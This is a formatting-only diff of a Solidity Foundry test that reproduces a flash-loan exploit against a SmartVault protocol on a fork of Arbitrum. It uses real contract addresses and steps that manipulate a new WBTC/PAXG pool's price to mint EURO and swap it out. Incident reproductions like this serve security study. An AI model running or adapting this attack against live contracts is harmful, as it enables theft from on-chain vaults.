@@ -29,6 +29,7 @@ interface NonfungiblePositionManager {
         uint256 amount1Min;
         uint256 deadline;
     }
+
     struct MintParams {
         address token0;
         address token1;
@@ -45,25 +46,20 @@ interface NonfungiblePositionManager {
 }
 
 interface IPositionsNFT is IPoolInitializer {
-    function collect(
-        NonfungiblePositionManager.CollectParams memory params
-    ) external payable returns (uint256 amount0, uint256 amount1);
-
-    function decreaseLiquidity(
-        NonfungiblePositionManager.DecreaseLiquidityParams memory params
-    ) external payable returns (uint256 amount0, uint256 amount1);
-
-    function mint(
-        NonfungiblePositionManager.MintParams memory params
-    )
+    function collect(NonfungiblePositionManager.CollectParams memory params)
         external
         payable
-        returns (
-            uint256 tokenId,
-            uint128 liquidity,
-            uint256 amount0,
-            uint256 amount1
-        );
+        returns (uint256 amount0, uint256 amount1);
+
+    function decreaseLiquidity(NonfungiblePositionManager.DecreaseLiquidityParams memory params)
+        external
+        payable
+        returns (uint256 amount0, uint256 amount1);
+
+    function mint(NonfungiblePositionManager.MintParams memory params)
+        external
+        payable
+        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
 }
 
 interface ISmartVaultManagerV2 {
@@ -73,11 +69,7 @@ interface ISmartVaultManagerV2 {
 interface ISmartVaultV2 {
     function mint(address _to, uint256 _amount) external;
 
-    function swap(
-        bytes32 _inToken,
-        bytes32 _outToken,
-        uint256 _amount
-    ) external;
+    function swap(bytes32 _inToken, bytes32 _outToken, uint256 _amount) external;
 }
 
 interface ISwapRouter {
@@ -93,36 +85,28 @@ interface ISwapRouter {
 }
 
 interface ICamelotRouter {
-    function exactInputSingle(
-        ISwapRouter.ExactInputSingleParams memory params
-    ) external payable returns (uint256 amountOut);
+    function exactInputSingle(ISwapRouter.ExactInputSingleParams memory params)
+        external
+        payable
+        returns (uint256 amountOut);
 }
 
 contract ContractTest is Test {
-    IPositionsNFT private constant PositionsNFT =
-        IPositionsNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
-    IERC20 private constant WBTC =
-        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
-    IERC20 private constant PAXG =
-        IERC20(0xfEb4DfC8C4Cf7Ed305bb08065D08eC6ee6728429);
-    IERC20 private constant EURO =
-        IERC20(0x643b34980E635719C15a2D4ce69571a258F940E9);
-    IWETH private constant WETH =
-        IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
-    IUSDC private constant USDC =
-        IUSDC(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
-    Uni_Pair_V3 private constant WBTC_WETH =
-        Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);
+    IPositionsNFT private constant PositionsNFT = IPositionsNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
+    IERC20 private constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
+    IERC20 private constant PAXG = IERC20(0xfEb4DfC8C4Cf7Ed305bb08065D08eC6ee6728429);
+    IERC20 private constant EURO = IERC20(0x643b34980E635719C15a2D4ce69571a258F940E9);
+    IWETH private constant WETH = IWETH(payable(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1));
+    IUSDC private constant USDC = IUSDC(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
+    Uni_Pair_V3 private constant WBTC_WETH = Uni_Pair_V3(0x2f5e87C9312fa29aed5c179E456625D79015299c);
     ISmartVaultManagerV2 private constant SmartVaultManagerV2 =
         ISmartVaultManagerV2(0xba169cceCCF7aC51dA223e04654Cf16ef41A68CC);
-    ICamelotRouter private constant RouterV3 =
-        ICamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
-    Uni_Router_V3 private constant Router =
-        Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    ICamelotRouter private constant RouterV3 = ICamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
+    Uni_Router_V3 private constant Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
     ISmartVaultV2 private SmartVaultV2;
 
     function setUp() public {
-        vm.createSelectFork("arbitrum", 147817765);
+        vm.createSelectFork("arbitrum", 147_817_765);
         vm.label(address(PositionsNFT), "PositionsNFT");
         vm.label(address(WBTC), "WBTC");
         vm.label(address(PAXG), "PAXG");
@@ -134,46 +118,23 @@ contract ContractTest is Test {
         // Attacker sent PAXG amount to exploit contract before attack
         deal(address(PAXG), address(this), 100e9);
 
-        emit log_named_decimal_uint(
-            "Attacker USDC balance before exploit",
-            USDC.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);
 
-        emit log_named_decimal_uint(
-            "Attacker EURO balance before exploit",
-            EURO.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Attacker EURO balance before exploit", EURO.balanceOf(address(this)), 18);
 
         address pool = PositionsNFT.createAndInitializePoolIfNecessary(
-            address(WBTC),
-            address(PAXG),
-            3000,
-            uint160(address(0x186a0000000000000000000000000))
+            address(WBTC), address(PAXG), 3000, uint160(address(0x186a0000000000000000000000000))
         );
 
         WBTC_WETH.flash(address(this), 1_000_000_010, 0, bytes(""));
 
-        emit log_named_decimal_uint(
-            "Attacker USDC balance after exploit",
-            USDC.balanceOf(address(this)),
-            6
-        );
+        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
 
-        emit log_named_decimal_uint(
-            "Attacker EURO balance after exploit",
-            EURO.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("Attacker EURO balance after exploit", EURO.balanceOf(address(this)), 18);
     }
 
-    function uniswapV3FlashCallback(
-        uint256 fee0,
-        uint256 fee1,
-        bytes calldata data
-    ) external {
-        (address smartVault, ) = SmartVaultManagerV2.mint();
+    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
+        (address smartVault,) = SmartVaultManagerV2.mint();
         SmartVaultV2 = ISmartVaultV2(smartVault);
 
         WBTC.transfer(smartVault, WBTC.balanceOf(address(this)) - 10);
@@ -204,80 +165,70 @@ contract ContractTest is Test {
         return this.onERC721Received.selector;
     }
 
-    function mintWBTC_PAXG()
-        internal
-        returns (uint256 tokenId, uint128 liquidity)
-    {
-        NonfungiblePositionManager.MintParams
-            memory params = NonfungiblePositionManager.MintParams({
-                token0: address(WBTC),
-                token1: address(PAXG),
-                fee: 3000,
-                tickLower: -887_220,
-                tickUpper: 887_220,
-                amount0Desired: 10,
-                amount1Desired: 100e9,
-                amount0Min: 0,
-                amount1Min: 0,
-                recipient: address(this),
-                deadline: block.timestamp
-            });
+    function mintWBTC_PAXG() internal returns (uint256 tokenId, uint128 liquidity) {
+        NonfungiblePositionManager.MintParams memory params = NonfungiblePositionManager.MintParams({
+            token0: address(WBTC),
+            token1: address(PAXG),
+            fee: 3000,
+            tickLower: -887_220,
+            tickUpper: 887_220,
+            amount0Desired: 10,
+            amount1Desired: 100e9,
+            amount0Min: 0,
+            amount1Min: 0,
+            recipient: address(this),
+            deadline: block.timestamp
+        });
 
-        (tokenId, liquidity, , ) = PositionsNFT.mint(params);
+        (tokenId, liquidity,,) = PositionsNFT.mint(params);
     }
 
-    function decreaseLiquidityInPool(
-        uint256 _tokenId,
-        uint128 _liqudity
-    ) internal {
-        NonfungiblePositionManager.DecreaseLiquidityParams
-            memory params = NonfungiblePositionManager.DecreaseLiquidityParams({
-                tokenId: _tokenId,
-                liquidity: _liqudity,
-                amount0Min: 0,
-                amount1Min: 0,
-                deadline: block.timestamp
-            });
+    function decreaseLiquidityInPool(uint256 _tokenId, uint128 _liqudity) internal {
+        NonfungiblePositionManager.DecreaseLiquidityParams memory params = NonfungiblePositionManager
+            .DecreaseLiquidityParams({
+            tokenId: _tokenId,
+            liquidity: _liqudity,
+            amount0Min: 0,
+            amount1Min: 0,
+            deadline: block.timestamp
+        });
         PositionsNFT.decreaseLiquidity(params);
     }
 
     function collectWBTC_PAXG(uint256 _tokenId) internal {
-        NonfungiblePositionManager.CollectParams
-            memory params = NonfungiblePositionManager.CollectParams({
-                tokenId: _tokenId,
-                recipient: address(this),
-                amount0Max: type(uint128).max,
-                amount1Max: type(uint128).max
-            });
+        NonfungiblePositionManager.CollectParams memory params = NonfungiblePositionManager.CollectParams({
+            tokenId: _tokenId,
+            recipient: address(this),
+            amount0Max: type(uint128).max,
+            amount1Max: type(uint128).max
+        });
         PositionsNFT.collect(params);
     }
 
     function EUROToUSDC() internal {
-        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
-            .ExactInputSingleParams({
-                tokenIn: address(EURO),
-                tokenOut: address(USDC),
-                recipient: address(this),
-                deadline: block.timestamp,
-                amountIn: 10_000 * 1e18,
-                amountOutMinimum: 0,
-                limitSqrtPrice: 0
-            });
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
+            tokenIn: address(EURO),
+            tokenOut: address(USDC),
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountIn: 10_000 * 1e18,
+            amountOutMinimum: 0,
+            limitSqrtPrice: 0
+        });
         RouterV3.exactInputSingle(params);
     }
 
     function USDCToWBTC(uint24 _fee) internal {
-        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3
-            .ExactOutputSingleParams({
-                tokenIn: address(USDC),
-                tokenOut: address(WBTC),
-                fee: 500,
-                recipient: address(this),
-                deadline: block.timestamp,
-                amountOut: 1_000_000_010 + _fee - WBTC.balanceOf(address(this)),
-                amountInMaximum: type(uint256).max,
-                sqrtPriceLimitX96: 0
-            });
+        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({
+            tokenIn: address(USDC),
+            tokenOut: address(WBTC),
+            fee: 500,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountOut: 1_000_000_010 + _fee - WBTC.balanceOf(address(this)),
+            amountInMaximum: type(uint256).max,
+            sqrtPriceLimitX96: 0
+        });
 
         Router.exactOutputSingle(params);
     }
